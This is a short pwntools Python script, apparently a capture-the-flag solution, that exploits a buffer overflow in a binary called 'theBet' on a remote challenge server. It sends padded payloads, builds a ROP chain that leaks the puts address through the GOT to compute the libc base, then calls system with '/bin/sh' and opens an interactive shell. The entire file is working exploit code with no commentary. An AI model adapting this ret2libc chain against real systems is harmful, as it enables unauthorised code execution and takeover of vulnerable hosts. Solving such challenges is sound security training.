#!/usr/bin/env python3

from pwn import *
from time import sleep

e = ELF("./theBet")
#r = process("./theBet")
libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so")
r = remote("gc1.eng.run", 31922)
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi'])[0]
ret = rop.find_gadget(['ret'])[0]
r.sendline(b"AAAAAAAAA")
r.sendline(b"1")
exploit = b"A" * 32 + p64(0) + p64(e.plt.read) + p64(e.sym.Capital_Punishment) + b"A" * 40
r.send(exploit)
sleep(1)
exploit = b"0" * 48 + p64(pop_rdi) + p64(e.got.puts) + p64(e.plt.puts) + p64(ret) + p64(e.sym.Capital_Punishment)
r.send(exploit)
r.recvuntil(b"Describe your argument:")
leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8, '\x00'))
libc_base = leak - libc.sym["puts"]
print(hex(libc_base))
sleep(1)
exploit = b"A" * 32 + p64(0) + p64(e.plt.read) + b"A" * 48
r.send(exploit)
sleep(1)
exploit = b"0" * 48 + p64(pop_rdi) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(libc_base + libc.sym.system)
r.send(exploit)
r.interactive()